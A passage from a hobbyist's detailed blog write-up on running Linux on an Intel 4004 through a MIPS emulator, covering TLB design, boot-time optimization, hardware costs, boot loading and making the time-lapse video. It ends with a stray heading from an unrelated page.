<p>As I explained <a href="https://dmitry.gr/?r=05.Projects&amp;proj=33.%20LinuxCard">before</a> (and I advise you to read it), the MIPS TLB is best emulated using a hashtable. As I explained above, the 4004 sucks at ... well .. everything. Using <span>XOR</span> or even <span>AND</span> for hashing would be a nonstarter as instructions to perform them quickly do not exist. I collected a list of all virtual addresses translated during Linux boot, and tried to find something that would be a passable hash function and also be easy and fast to compute on the 4004. I decided on taking the 3rd nibble of the address and adding it to the 6th nibble of the address. The resulting value can be the hash of the address, placing it into one of 30 buckets. This produced passable results and does not take too long to compute. Status nibbles of the 4002s came in handy here. While the actual TLB entries live in data nibbles, each entry taking up one "register", the status nibbles provide links to "prev" and "next" entries in the current hash bucket. For the first entry in the chain, the bucket index is stored instead of "prev". This allows easy removal, which is needed on TLB write.
</p>
<h3>Debugging the emulator</h3>
<p>Predictably, a brand new emulator, written in assembly for a new platform will have bugs. u4004 made debugging easier, since at least I did not need to use real slow hardware. Additionally, it could be instrumented to understand the deeper emulated MIPS system. I commandeered a few unused 4004 opcodes to mark a few important places in the emulator. One of them was the place where a new MIPS instruction had just been fetched. This opcode will be ignored by a real 4004 (treated as a NOP). u4004, however, knows the memory layout of the emulator and can do more checks. It has the option to log the emulated MIPS state to console for easier debugging. It can (and does) also check the TLB state for consistency. Getting this right took a lot of work, so having this auto-checker was worth its weight in gold. If it notices an inconsistency, it will abort the emulation.
</p>
<p>What good is aborted emulation? Well, u4004 also records the state of the entire 4004 CPU every single cycle. On abort, it will print out the state for the last 16,384 4004 instructions, allowing a lot of backtracking to see what went wrong to cause the inconsistent TLB state, why, and how. This proved to be instrumental in a few tough-to-catch bugs my MIPS emulator had. Sixteen thousand 4004 instructions is, usually, at least 10 MIPS instructions. As the TLB checker is engaged after each one this allows for a lot more lookback than should ever be needed.
</p>
<h3>MOV</h3>
<p>MIPS has no <span>MOV</span> instruction. To copy a register to another one, a number of instructions can be used: an addition of zero (immediate or register), a logical or exclusive OR with a zero (immediate or register), a left shift by zero bits, a logical AND or OR of a register with itself. Different compilers do different things, and I tried to make sure my code had fast paths for the most common ones: shift left by zero bits and immediate add of zero.
</p>
<h3>Playing tetris</h3>
<p>As conditional jumps have limited range that is also not symmetric (depending on the position of the jump instruction), code placement is crucial. This is also true for jumptables which must start at the start of a ROM page. It is equally crucial for LUTs that also need that same alignment. This all means that code gets moved around a lot, and every time some piece of code changes size, other pieces need to move around to maintain reachability of jumps. I had to do this a lot during development. You'll see a lot of <span>ORG</span> directives in the assembly that align code to proper boundaries. Sadly, the <span>A04</span> assembler does very little checking around this, so an <span>ORG</span> directive that moves the current output address backwards does not get treated as an error, instead blindly overwriting the old bytes at the same output address. This caught me by surprise a few times during development, causing crashes. I advise you to be careful if you try to modify the emulator.
</p>


<h2>Speed optimization</h2>
<h3>Methodology</h3>
<p>Now that I had a working emulator of my actual board I would build, I could run multiple versions of firmware on it to evaluate speed it would have had on real hardware. This was much better than testing on the real board, waiting for days for a single boot to complete (or fail). I did a lot of this, trying many things, incorporating improvements into the firmware, tracking boot time to first shell prompt. Once the emulator emulated a real SD card and real SPI PSRAM without hypercalls, the expected boot time could be measured and would have been around 8.9 days of real time on a real 4004 at 740KHz.  My <em>initial</em> goal was to get the boot time under a week. Looking back at my log, some of the major wins on this were: lookup tables for logical ops and a lookup table for multiplication. This brought the expected boot time down to 8.4 days. At this point in time, I added some profiling to the emulator and had it print the hottest instructions. This provided some guidance!
</p>
<h3>Fetch</h3>
<p>The longest part of emulating any instruction turned out to be reading it from memory. I considered adding an i-cache but this would require keeping the PSRAM chips' select line active even longer. Since I was already out of spec by a factor of a thousand, I did not wish to push my luck. It would have also required more RAM, and this was counter to my desire to minimize RAM usage to make the project more affordable. So what could I do? First, I unrolled the loop that received a nibble of data from SPI PSRAM, then I did the same for the code that sent a nibble. This lowered the boot time all the way down to 7.25 days!
</p>
<h3>Memory copy</h3>
<p>Since it is impossible to pass 32-bit values in registers in 4004 assembly (that would take up half the entire register file), data is often passed to functions in specified memory locations. This means that quite a lot of time is spent copying data into and out of those locations. From the very start I made sure that no data crossed the 16-nibble address boundaries so that a simple increment could be used to access all variables, but even then, copying 8 nibbles took a while, especially between memory banks. Now that I had more ROM space, compared to when I initially started intending to fit into 4KB, I specialized some copies, unrolled some as well. The boot time dropped to 6.63 days!
</p>
<h3>More RAM</h3>
<p>I noted that I had one pin free on the output port from the 4002 that drove my PSRAM. I wondered if I could add another PSRAM, to give Linux more RAM. Adding it was not too much work, mainly having to do with decoding the address to sort out which PSRAM to activate. Since Linux will handle non-contiguous physical RAM space, I could take advantage of this to make decoding easier. So, my first RAM chip is emulated at <span>0x80000000</span>, while the second starts at <span>0x82000000</span>. This particular arrangement allows the assembly code to quickly go from address to proper port value to select the correct chip. I also added code to probe RAM size in my MIPS bootloader (more on which later) and pass this to Linux.
</p>
<p>Sadly, adding more RAM slowed the boot down. Linux creates data structures at boot that track physical pages and with more pages, more of them had to be created. Some kernel data structures are also dynamically sized based on available memory, and that also suffered. At this point in time with 16MB of RAM, boot time was projected to be 7.19 days. Back over a week! Womp!
</p>
<h3>Clawing it back</h3>
<p>I was not going to give up so easily. More specialized memory copying routines were created, instruction dispatch got better by a cycle here and there. It was getting close - 7.03 days. I had an epiphany then. Why have a separate memory storage for the current instruction if I was already going to load it into registers? If I carefully track their liveness, I can skip this entirely and just load it into the same temporary storage that all memory loads go to. Down to 6.50 days!
</p>
<h3>Better shifts</h3>
<p>Recall that I initially implemented logical shifts as one-bit-at-a-time, as a sacrifice to my lack of ROM code space. Well, now I had more space, so it was time to improve. I rewrote the shifts to first do full-nibble copies for any part of the shift that was a multiple of 4 bits, and then do bit-by-bit shifts for at most three iterations. For left shift this was trivial, but for arithmetic right shift this required some careful consideration for proper sign extension. After some fun debugging of some cases where I got it wrong, it worked. Boot time was projected at 6.19 days!
</p>
<h3>More RAM access unrolling</h3>
<p>There were a lot of things I could do now that I had more ROM space. Unrolling the PSRAM address-sending code, which ran on every access had some nice pay-offs. The loop control was not very much there, but for code that runs a lot, every cycle matters. How much? Unrolling that loop with 6 iterations lowered the boot time to 6.01 days! That is not bad at all for some copy-n-paste work!
</p>
<h3>A look at WHAT runs</h3>
<p>The Linux kernel contain{s,ed} a whole lot of nonsense that this system would never need. Nobody is going to be doing TCP/IP at this speed, nor does it really need support for esoteric filesystems or antique syscalls that nobody has used since the 1990s. I went to town removing kernel configs that were of no use! The kernel size shrank down to about 2.5MB and the boot time dropped too. A part of the drop was simply the time it took to load the kernel to memory, but another part was the kernel no longer initializing subsystems that would never be of use. The kernel also creates a dummy console in RAM to log to, even if told to log to serial console. Managing that and virtually "scrolling" it took noticeable time, so I configured it to be 1x1. This made a noticeable boot time difference too!
</p>
<p>Almost all of my initial testing was with <span>init=/bin/sh</span> kernel command line, but this is not fair, since this does not leave you in a good state, with no session, no <span>$PATH</span>, no <span>/proc</span> or <span>/sys</span>, etc. On the other hand, using a real init would take months, since the password hashing itself would take that long. I wrote a tiny init (<span>init=/sbin/uMIPSinit</span>) that would set up a sane session, mount <span>/proc</span> and <span>/sys</span>, set the hostname and <span>$PATH</span>, and finally launch <span>sh</span> repeatedly as it dies. The sources to it are in the disk image at <span>/root/init.c</span>. Obviously this made the boot slower, but the smaller kernel made up for it. Boot time was 5.33 days now!
</p>
<p>Linux supports block devices over 2TB in size. I had a hunch that disabling this support would help with speed. Why? A 2TB device of 512-byte sectors has sector numbers not representable by 32-bit numbers, necessitating 64-bit math. 64-bit math on a 32-bit MIPS CPU takes a lot of work, so I had a hunch that avoiding it would help. It did, but it also presented a fun problem. My rootfs, being a garden-variety ext4 filesystem had (as is default) <span>huge_files</span> feature enabled. This had to be disabled to allow it to be mounted read-write on a kernel with huge block device support removed. It was all worth it though! The boot time dropped to 4.81 days!
</p>
<h3>Fetch again</h3>
<p>As a special last-ditch optimization, I added a code path for instruction fetch from SPI PSRAM, this code path assumes the read is 32 bits in size and that it targets SPI PSRAM. This is sane because the virtual system has no other places to run code from. Avoiding checks for need to sign-extend and for size loops added a small additional speed benefit: 4.76 days to boot! This calculates out to being around a 70Hz MIPS machine if the 4004 is run at 740KHz.
</p>
<h3>On host CPU speed</h3>
<p>As mentioned before, each 4004 instruction takes either 8 or 16 clock cycles to execute. The 4004 is specified to run at 740KHz. Intel wanted to ship it at 1MHz, but apparently it couldn't perform at that speed across its entire temperature and voltage range. On my board, however, I am overclocking it to 790KHz with no issues. This is accomplished by running the 4201 in "divide by 7" mode with a 5.5296MHz crystal. For a Linux boot with my emulator, the actual 4004 instruction mix is 8.8% 16-cycle instructions, 91.2% 8-cycle instructions. This means that on my Linux/4004 board the effective speed of the 4004 is 90,640 instructions per second! I am not yet sure if this is a cause for celebration or tears.
</p>

<h2>Hardware cost optimization</h2>
<h3>"Affordability"</h3>
<p>Throughout this project, ability for someone to replicate my work was my top concern. This is why I avoided using a 4265, for example. I could have avoided using the 4201, but the alternative methods of generating the clock were quite complicated and not very precise clock-speed-wise. Intel's recommended clocking schematic is shown in a previous section above. It is quite a mess. I simply did not want to do that, so I chose to use a 4201. Using the 4289 was a simpler decision. It is much easier available than the 4008 + 4009 combo. I considered designing the board to accept either of those, but lacking a 4008 to test wish, I decided to not risk it. I did design the board to accept a 4040 instead of a 4004, and verified that this works. No extra capabilities of the 4040 are used, to maintain the 4004 compatibility. In reality, the benefits would not be great, anyways.
</p>
<p><a href="https://dmitry.gr/images/4004mipsCyclesToBootVsTLB.png"><img alt="Scatter plot showing an inverse relationship between TLB size and boot times" src="https://dmitry.gr/images/4004mipsCyclesToBootVsTLBsmall.png"></a></p><p>Most of the RAM usage by the emulator is non-negotiable. The MIPS register state will never be smaller than 32x 32-bit registers. The emulator state will never be smaller than the 96 bytes it occupies. However, the TLB can be variably-sized, as I mentioned above. So, in the interest of allowing some money to be saved in replicating this project, my code allows one to populate 1, 2, 3, or 4 chips in the 3rd RAM bank, producing a TLB of 4, 8, 12, or 16 entries. The chips in that bank need to be populated in-order, from left to right, so the options are 1 or 2 4002-1s, and if you have two populated, then you may also populate 0, 1, or 2 4002-2s. As expected, the performance scales inversely to the number of TLB entries. I should warn, however, that the 4002s that provide the TLB also provide the LED outputs for the high 16 bits of the <span>PC</span> display LEDs, so if you partially populate this RAM bank, some of the LEDs will not work.
</p>
<p>A fun sidenote: the code actually will probe and support any TLB size from 1 to 16 entries. Each 4002 holds 4 entries so in the real world, only multiples of 4 are possible, but in the emulated world, anything is possible, so I tested every value between 2 (the minimum to boot) to 16. Here you can see a graph of the number of MIPS CPU cycles needed to boot to shell vs the number of emulated TLB entries. It is notable that while the difference from 4 entries to 8 is large, the difference from 12 to 16 is not, so populating just an 8-entry TLB might be enough. This can save you about $50 at current prices...
</p>
<h3>The prices for 1971 chips</h3>
<p>Sadly, you'll still spend quite a bit of money buying the 1970s parts. Here I have a table of the necessary old chips, their various names, and my best guess as to how much you'll pay (as seen by me on eBay USA at the time of publication). Some parts were only available from intel, while others were also available from National Semiconductor. Parts annotated with (g) are ceramic with gold (usually white ceramic, most rare, most expensive), (c) are parts that are grey ceramic (also rare, also expensive), and parts with no annotations are plastic and are the cheapest (still expensive). All of the part numbers listed in each cell <em>function identically</em> so you can buy the cheapest. I also designed this board to accept either a 4004 or a 4040, so you only need to buy one of them, probably whichever is cheapest. I am unable to explain the price difference between 4002-1 and 4002-2, since they are basically the same chip.

</tbody></table>
<p>It should be noted that the prices are so high because of "collectors" who buy up these CPUs with no intention of ever using them. To them, any 16-pin chip laser-engraved with "P4004" would do just fine, but they instead insist on buying real chips, denying their use for real projects! What a dick move! However, it gets worse. The chips with gold caps are also sought out by people who "harvest" gold from them. This is a euphemism for grinding them up, destroying them forever. Ugh!
</p>
<h3>The modern parts</h3>
<p>The modern parts of this project are downright affordable in comparison. The one thing that might be hard to source is the SPI VFD, but they do show up on eBay often, and I got mine for $15 each. Alternatively, another SPI display can be used with small code changes. You can also just not populate the VFD at all and interact with the device over the serial port only - this is fully supported and works well.
</p>
<p>I also added some cleverness around the SPI PSRAM usage. PSRAM chip count and size is auto-detected. The first PSRAM must be at least 4MB in size, since the kernel expects to be loaded contiguously there and it is 2.5MB in size. So populate a 4MB or an 8MB chip first. If you work at ISSI and have access to a pre-production 16MB chip, that will also work. The second PSRAM chip can be left unpopulated, or populated with any size chip you have. I tested everything from 128KB to 8MB. Keep in mind that while more RAM will help Linux run better, it will slow down the boot process slightly. Sizes under 128KB are unsupported.
</p>
<p>Thanks to my work on minimizing the size of the Linux kernel by aggressively culling the kernel config, the kernel I provide is small enough that you can boot to a shell prompt without using swap on only 4.5MB of RAM (eg: a 4MB chip + 512KB chip). You may then enable swap and go on. Although, given the cost of 8MB PSRAM chips, I do not know why you'd do this other than just curiosity.
</p>

<h2>How it works</h2>
<h3>The connections</h3>
<p><a href="https://dmitry.gr/images/4004schem.png"><img alt="ILinux/4004 board v1.2 schematics" src="https://dmitry.gr/images/4004schemSmall.png"></a></p><p>At a high level, ignoring all the level shifting messes, the board is pretty simple. The 4201 generates the clock and reset signal for all the components. An RC network generates the reset input signal for it. The 4002s in the first and third banks are connected to the <span>PC</span> LEDs, in the obvious order. The first bank provides the low 16 bits, the 3rd provides the high 16 bits. The second RAM bank provides all the outputs used for driving various SPI busses and the ROM bank selection, so any 4002 mentioned from now on in this section is a 4002 in the second RAM bank. This RAM bank is composed of three 4002s. Board space is provided for a fourth 4002 in this bank, if you want to use this board for some other reason, eg as a fancy 4004 dev board. The first 4002 in this bank is used for the SD card's SPI bus. In order, the output pins are: <span>MOSI</span>, <span>CLK</span>, and <span>nCS</span>. The last output pin acts as <span>A12</span> to the ROM, flipping ROM between bank 0 and bank 1. The second 4002 is used for communications. Its outputs, in order, are: <span>MOSI</span>, <span>CLK</span>, <span>VFD.nCS</span>, <span>UART.nCS</span>. The third 4002 is used for the PSRAMs. Its outputs, in order, are: <span>MOSI</span>, <span>CLK</span>, <span>RAM0.nCS</span>, <span>RAM1.nCS</span>. The 4289 is connected to the lower 12 address lines of the ROM. Its inputs are, in order: <span>PSRAM.MISO</span>, <span>VFD.MISO</span>, <span>UART.MISO</span>, and <span>SD.MISO</span>. UART chip's <span>IRQ</span> line drives the <span>TEST</span> input on the 4004. That is basically it!
</p>
<h3>SD card access</h3>
<p>What could be simpler, one would think, than accessing an SD card? The spec is rather clear on how to do that over SPI: three wires to the card, one back; send some commands to init it, then one command is for read and another is for write. Trivial, right? It might be for modern microcontrollers that have kilobytes of RAM. The Linux/4004 board has a total of 440 bytes of RAM, if you count the un-addressable status nibbles, 352 if you do not. Of them, 160 (or 128 if you do not count the status nibbles) are hard-allocated to virtual MIPS registers, and another 160 (or 128 if you do not count the status nibbles) are hard-allocated to the TLB. This leaves 120 (96) bytes of RAM left. This is not enough to talk to an SD card, since the minimum unit of reading or writing an SD card is a 512-byte sector (very old SD cards allowed partial-sector reads, but partial-sector writes were never a thing). Adding another full RAM bank would only add 128 addressable bytes. It would take 4 full banks to fit a single 512-byte sector. This would force me to use an external 3-to-8 decoder to allow the 4004 to address this much memory. Plus, those chips are expensive! And, I had sworn I would not do this. Another solution was needed.
</p>
<p>Well, the SD card has its own SPI bus, as do the PSRAMs. The emulator itself never really needs to process SD sectors' contents, only place them into the virtual RAM or write them from the virtual RAM to card.  So, the SD sector data can always be read directly into PSRAM, or from it. This will work nicely since they have separate SPI busses. As we read card data, every 4 bytes we read, we'll write to PSRAM at the requested address, and then increment it by 4. Repeat 128 times. Writes will work much the same way. Due to the slowness of the 4004, this process is hilariously slow. It takes a bit over a second to read or write a sector to the card. But at least no extra 4002s chips are needed!
</p>
<p>Which brings us to a potential issue with SD card access. The SD spec specifies that to properly initialize an SD card, one needs to send <span>ACMD41</span> at a clock rate of 100KHz - 400KHz, and at least once every 50ms. The SPI bit-banged out the output ports of a 4002 cannot meet either of those timings. I cannot even approach them. I had some concerns. They went away quickly. Every SD card I tested happily initialized even at 5KHz, with <span>ACMD41</span> sent every 200ms or even more rarely. I guess this makes sense since modern SD cards do not use the provided clock for anything internal, like original ones might have considered doing.
</p>
<h3>How it boots</h3>
<p>The firmware necessarily must know how many TLB entries there are, since it needs to prevent the virtual MIPS CPU from populating the <span>INDEX</span> register with a higher value, and it needs to make sure that the <span>RANDOM</span> register also never presents a higher value. The firmware, thus, starts by probing the number of memory chips in the third bank, to then figure out how many TLB entries there are. Then, the VFD and the UART chip are initialized, then the SD card is initialized. If this fails, a message is shown: "Failed to init SD card. Halting here and now!". This message is the only string in the entire firmware, since bytes in this ROM are worth their weight in gold!
</p>
<p>Every byte in the firmware has a high cost due to the very limited nature of how many bytes of ROM the 4004 can address. Additionally, having a virtual ROM requires an extra check in the decoding code for every memory access. No, it is not worth it to have a virtual ROM like the real DECstation 2100 had. Instead, my firmware simply loads the first SD card sector to the beginning of RAM (<span>0x80000000</span>), and then jumps to there. The code there is, as you'd expect, limited to 446 bytes that there is before the partition table starts. The code reads the partition table (which is also in RAM, as it is part of the first SD sector), finds a partition with type <span>0xBB</span>, and reads it, in its entirety, to RAM at <span>0x80001000</span>. If this goes well, it jumps there. If the partition is not found or the reads fail, a short message is shown using a trivial function that can output a string to the console using a hypercall to print each character.
</p>
<p>This second loader can be arbitrarily large (mine is about 14KB) and can be written in C. When there is this much space, you get some creature comforts, like real <span>printf()</span> with formatting. I mostly reused the loader from the <a href="https://dmitry.gr/?r=05.Projects&amp;proj=33.%20LinuxCard">LinuxCard</a> project, but with some adjustment and simplification. When every cycle counts, one seeks to reduce the number of cycles used. I simplified and prettyified the progress bars and removed zeroing of the <span>.bss</span>, since the kernel will do it itself.
</p>
<p>Some things, however, had to be added. The RAM size probing is done here now instead of in the emulator itself. This saves space in the emulator firmware. The emulator treats each of the two RAM windows (<span>0x80000000</span> and <span>0x82000000</span>) as being 16MB in size always. It counts on Linux to only use the RAM that really exists. But how would Linux know? It asks the bootloader using the <span>REX API</span>. How does the bootloader know? It probes the RAM and notes the sizes of each one. The loader also probes the TLB entry count (by writing incrementing values to the <span>INDEX</span> register and seeing when the write does not take, as the emulator limits writes to valid values). This does not need to be communicated to Linux, as it does not care. But it is nice to know, so it is printed onscreen.
</p>
<p>Eventually, the loader finds the partition marked as <em>active</em>, mounts it as a FAT12/16/32 filesystem, finds a file called <span>vmlinux</span> on it, parses it as an ELF file, loads it to RAM if it is valid, and jumps to its entrypoint, giving it the proper parameters of machine type, a magic value, and a table of callbacks into "ROM" for things like RAM mapping and early console printing. If any part of this fails, a descriptive message is shown onscreen.
</p>
<p>As a small improvement, to save time on busyloop calibration, I ran it once, recorded the value, and now provide it via the kernel command line. This saves noticeable time every boot.
</p>
<h3>How it runs</h3>
<p>Disk access, same as in <a href="https://dmitry.gr/?r=05.Projects&amp;proj=33.%20LinuxCard">LinuxCard</a>, is provided by the PVD paravirtualized disk driver. This is much simpler than attempting to emulate the SII SCSI chip and a SCSI disk in 4004 assembly. The hypercall to read or write a sector acts like DMA to the virtual MIPS machine, completing instantly and delivering data to virtual RAM or taking it from virtual RAM. The driver is completely unmodified from its state in  <a href="https://dmitry.gr/?r=05.Projects&amp;proj=33.%20LinuxCard">LinuxCard</a>.
</p>
<p>As virtual timer interrupt ticks at 16Hz, and and IRQ is delivered to the virtual CPU every 65,536 virtual instructions, the virtual CPU thinks it is running at 1.05MHz. My testing shows that the actual emulated speed of the MIPS guest is around 70Hz at 740KHz. I run the 4004 at 790KHz, so the emulated guest is thus operating at about 74.73Hz. So time for the guest is dilated by 14,030x. This means that a virtual second is, in real life, around 3h54. Four hours per virtual second, basically!
</p>
<p>The power consumption is around 6W, so any PD-compliant USB-C brick capable of supplying 2A @ 5V will do. The LED next to the SD card is a combination power/activity light. Since the guest CPU is so slow, even very active SD card usage is very low duty cycle. Thus, mostly the SD card will be idle. This fact is used to make a combined indicator light. It will be on while the board is on, and go off for about a second for every SD card sector read.
</p>

<h2>The art of it</h2>
<p><img alt="Mandelbrot set in text mode 40x13" src="https://dmitry.gr/images/4004_mandelbrot.png"></p><p>The goal of this project was always partially artistic. This is why the board has a pretty VFD on it, why I designed it to look retro, and why it has hanging holes on the top corners! The idea is that, once completed, it can be hung on a wall where it will slowly do ... something. What could that something be? Well, I wrote a simple program that draws (in text mode) the mandelbrot set on the VFD (and on serial port). There are two versions: one uses floating point numbers (<span>/root/mandelbrot</span> in my image), which Linux ends up having to emulate, which makes it slow - around 30 days to draw the entire 13 rows x 40 cols image. The second version is integer-only (<span>/root/mandelbrot_nofp</span> in my image). That one completes in under 9 hours. But for the one I'll have hanging in my office, I have loftier goals. With swap enabled, the kernel sources can actually be built right on-device. It will take some number of years. The partition where the kernel lives is <span>/dev/pvd2</span> and is mounted under <span>/boot</span>. The device can build its own kernel from source, copy it to <span>/boot/vmlinux</span>, and reboot into it. If power is interrupted, thanks to ext4, it will reboot, recover the filesystem damage from the journal, and restart the compilation process. That is my plan, at least.
</p>

<h3>Kit or pre-built</h3>
<p>I am considering offering this as a kit. You'd get the board and all modern parts labeled and ready to assemble. Other than the three surface mount parts, all others are very large through-hole components that anyone can assemble trivially. The PSRAMs are also quite easy to solder down as they only have 8 pins with large spacing. If you are interested, write to me at <a href="mailto:kit4004@dmitry.gr">kit4004@dmitry.gr</a>. I might offer a kit that also includes the 1970s components. The price on that one will mainly depend on the costs of acquiring the old chips.
</p>

<p>I do have enough components to build a few fully-working boards, tested and with all the chips. If you <em>REALLY</em> want one and do not want to do any work assembling one, write to me at <a href="mailto:full4004@dmitry.gr">full4004@dmitry.gr</a> and we can discuss. It will <em>not</em> be cheap, as you can guess.
</p>

<h2>Making of the video</h2>
<p>This was an adventure enough to warrant its own section
</p>
<h3>Capturing</h3>
<p>Of course, this was not going to be easy, but I must admit that I severely underestimated how difficult this would end up being. The idea was simple: set up a phone to take a photo every second or so, collect the photos, make a video. Done. Right? Let's do some math. A 1920x1080 photo is around a megabyte in size. Taking a photo every two seconds generates around 1.76GB of data per hour. The filming took 9 days, which is 216 hours. It will, thus, produce around 379GB of photos in approximately 388 thousand files. I guess I'll need to come and offload all the photos from the device a few times to keep it from filling. Annoying but doable. Let's try!
</p>
<p>I initially tried to use an old Pixel 5. I used an app that takes a shot every second as a test to see how well it would go. The device hard-hung overnight. I tried again, it did again. OK... I tried an older Pixel 3 XL. In the morning it was hung and too hot to touch. I am happy that the battery did not explode, having been heated that much. I gave up on android devices at around this point. The next candidate, logically, was an iPhone. I had an iPhone SE3 around that I strapped into the tripod to test. On iOS there was no free program I could find to do a timed capture with no shot limit, so I was forced to buy <a href="https://apps.apple.com/us/app/selfer-timer-camera/id1594398165">this one</a>. It is quite annoying to have to buy an app whose sole function is one library function call a second and a <span>sleep()</span>, but this was faster than digging up Xcode and writing it myself. Overnight, the iPhone stayed functional. In the morning it was still taking photos and was not even warm to the touch. A tip of my hat to Apple engineers!
</p>
<p>The actual filming was slow, as expected. I set up a video camera so I could watch remotely and know when to come to enter the next command. I did mess up once, however. When I entered the <span>uname -a</span> command, I did not press ENTER. I only realized that later - next afternoon when I noted that the cursor was still on the previous line. I came over and pressed it then, but this added 9 hours of nothingness to the video.
</p>
<h3>Getting the data</h3>
<p>Said hat tip was soon rescinded. SE3 does not have the storage to capture all the photos. I had planned to offload the data once a day using either the "Photos" app or the "Image Capture" app on a connected MacBook. After about two such offloads, Photos app stopped seeing new photos in device memory. I tried re-plugging USB and restarting the MacBook. Neither worked. Restarting the phone did, but of course this creates a gap in the recording and is unacceptable. Image Capture seemed to work better. It could copy photos off and delete them from the device, freeing space. Good! After three such offloads, the "delete" functionality stopped working. It could still copy new photos from the device but it refused to delete any. Again, the only thing that helped was restarting the phone. Again, this is unacceptable.
</p>
<p>I tried a few more times, wasting a few more days, with no better luck. I gave up and grabbed an old 512GB iPhone 12 Pro Max with a shattered screen, shelled out $130 to have it replaced with the cheapest third-party display, and strapped it into the tripod. I decided to just capture everything nonstop and grab the photos later. This should have allowed me to skip the bugs in Photos and Image Capture apps.
</p>
<p>Final photos taken, it was time to grab the images from the phone and stitch them into a video. This did not go well. Photos app only saw around 100,000 of them. The number differed every time I plugged the device in, but never rose to the correct number around 400,000. If I tried to tell it to import anyways, it hung. Leaving it alone for a day produced no results. Image Capture had a similar issue, although once it saw around 200,000 photos - a number that Photos never got up to. If told to import, it would say "Importing FILENAME.JPG" and stop there, having created a zero-sized file with the given name in the target directory.
</p>
<p>OK, I can try to make a local backup of the iPhone to a MacBook, then decrypt the archive and get photos out, right? The backup button in Finder worked. As expected, the iPhone asked for the pincode to authorize the backup. The progress bar showed the moving cross-hatched pattern... a day later no progress had been made. Maybe AirDrop will work? Well, first of all, there is no way to select all photos in the Photos app (still) without dragging your finger across them all. You have no idea how long this takes for 400,000 photos, especially as the app gets slower and laggier as you go on. Somehow there is no "select all" option. I lost patience at 20,000 photos selected and decided to try to AirDrop those, then select more. The Photos app crashed trying to AirDrop this many photos. I tried with 10,000 and it crashed again.
</p>
<p>Fine! I'll give up and use the cloud. I installed Google Photos and told it to backup to my account. It took over an hour "preparing to sync". It then synchronized around a hundred photos and promptly crashed. Opening it again produced the same result - over an hour of preparation, and another 100 photos got uploaded. This was not sustainable, neither in rate nor in manual labour required to keep re-opening the app. Unlike Apple's Photos, Google Photos <em>DOES</em> allow easy multi-select. With one tap I was able to select all photos taken on a given "Tuesday" and click the "Back up" icon. The app promptly crashed.
</p>
<p>In frustration, I paid Apple for 2TB of iCloud, figuring that the cost of one month of it is fine to resolve my growing frustration. No crashes, and it started syncing. The sync speed hovered at around one photo every 5 seconds. My internet connection has 1 Gbit/s upload so it was not that problem. This was going to take forever!
</p>
<h3>Getting desperate</h3>
<p>Maybe Windows could do better? I plugged the iPhone into my ThinkPad running Win10x64. It is supposed to show up in "My Computer" and have a <span calss="code">DCIM</span> directory with photos in it. It did the former, but not the latter. Googling around indicates that this is common - iPhone asks for pincode to confirm trusting the PC, and then nothing still. The typical "solutions" include "try cleaning your registry" and other such idiocy. OK... I guess it is Linux time? My Thinkpad had an install of Linux Mint 18 on it. It saw the iPhone but also saw no photos on it. Googling around indicated that some work had been done <em>rather recently</em> on iPhone &lt;-&gt; Linux comms, and a tool called <span>ifuse</span> can successfully mount an iPhone using FUSE. The version in Linux Mint 18 was too old to work, of course. It failed with incomprehensible errors, and panicked my kernel once.
</p>
<p>In the typical "it is called open source because you have to open the source to get anything at all to work" fashion, I had to download it and build it from source. Some dependencies were also too old, so I had to build them. Eventually, after much googling, building, installing, and cursing, all the things were built and it was time to try them. <span>idevicepair</span> successfully paired to the device. <span>ifuse</span> mounted the device at a given mountpoint, and there was indeed a non-empty <span>DCIM</span> directory in there! Success! I'll just drag that over to my desktop and be done, right? Well, that hung. I guess the Nautilus file manager was not prepared for such large copies. Maybe it tried to <span>stat()</span> each file or maybe it has some <span>O(n^3)</span> algorithms in there. I do not know. I re-plugged the iPhone, re-mounted it, and used good old <span>cp -Rvf</span> to copy all 400,000 files uneventfully ... over 10 hours.
</p>
<h3>Making the video</h3>
<p>Dealing with this many files was annoying in a number of ways, and the sole working solution was almost always some soft of a CLI utility or script. After getting all the files out, they had to be renamed to sequential names. I did not dare mess with my hard-gotten source material, so instead they were <em>copied</em> with new names. A file list, <span>vim</span>, and one very gnarly regex later, a command list was created to do the copies. The copying took a little over 3 hours. I am not sure if I should blame ext4, md-raid, or myself for this...
</p>
<p>I have never used any video editing apps, and I saw no reason to start now. A series of very messy ffmpeg commands were used to create the title screens, add the music to the first, create the video from the photos, and combine them all together into the final video. There is no time missing in the final video, but the playback speed is variable to speed up the boring bits. There is a clock and a calendar visible onscreen so you can easily see the time elapsed. Playback speed varies between 5FPS (10x realtime) and 960FPS (1920x realtime) to keep the video short(ish) and to-the-point(ish). It is hilarious that at some points in time you can see the changing of day to night and back by the light shining onto the table from the window (out of frame to the right). Due to the speed-up used, you may miss the blinking of the SD activity light (though you can see it blink a few times as the rootfs is being monted and later as <span>ls</span> executes). Sorry. However, if you really want to see it, see next paragraph.
</p>
<p>For those who like raw data, do not trust my edits, or just want to see it at a constant speed, I also produced a completely unedited version of the video, which you can see <a href="https://youtu.be/IPGLStPP9p8">here</a>. As the capturing was done at 0.5FPS and the playback in this video is at 60FPS, the video is sped up 120x from realtime. As 4 hours of realtime map to one second of emulated time, and the video is 120x faster than realtime, 2 minutes of video map to one second of emulated MIPS processor time.
</p>



<h2>Downloads</h2>
<p>The disk image for the SD card can be downloaded <a href="https://mega.nz/file/0hR2SYhR#bgdznRljt7oKV39XzfSqKjoJADRmvlm4mxs-z_FtuSc">here</a> (mirrored <a href="https://drive.google.com/file/d/1P8kvblvjH09dSJ0_jXgAnFyOgB80u-Q0/view?usp=sharing">here</a>). It is a separate download due to its size. The main download is <a href="https://dmitry.gr/images/Linux4004.tar.bz2">here</a>. It contains the MCS-04 bus analyzer for Saleae software, source code for the i4004 Dectstation2100 emulator, source code for the MIPS MBR and second stage bootloaders, kernel config and version info, as well as my very-scary u4004 emulator of the Linux/4004 board.

<h2>Credits</h2>
<p>Much thanks, as usual, to my cats for cutely sitting near my feet as I worked on this, <a href="https://www.youtube.com/@TubeTimeUS">Eric (TubeTimeUS)</a> for bravely loaning me some MCS-04 chips before I could acquire my own, eBay for occasionally supplying good deals on old chips, and <a href="https://www.entropicengineering.com/">M @ Entropic</a> for helping me fix my shitty switch-mode -10V  supply. This time, the mount-rushmore-sized middle finger goes out to MCS-04 "collectors" who gobble up the supply at insane prices with no intention to ever use them. My offer to you, miscreants, is simple: I will trade you any working MCS-04 chip you have for a very pretty PDIP-16/24/40 that I will have laser-engraved with the same exact label. Nobody who "sees" your collection will ever know, and the world will gain another MCS-04 chip that might actually be used!

            Why Britain has stagnated

          <h3 id="setting-the-scene">Setting the scene</h3>
          <p>
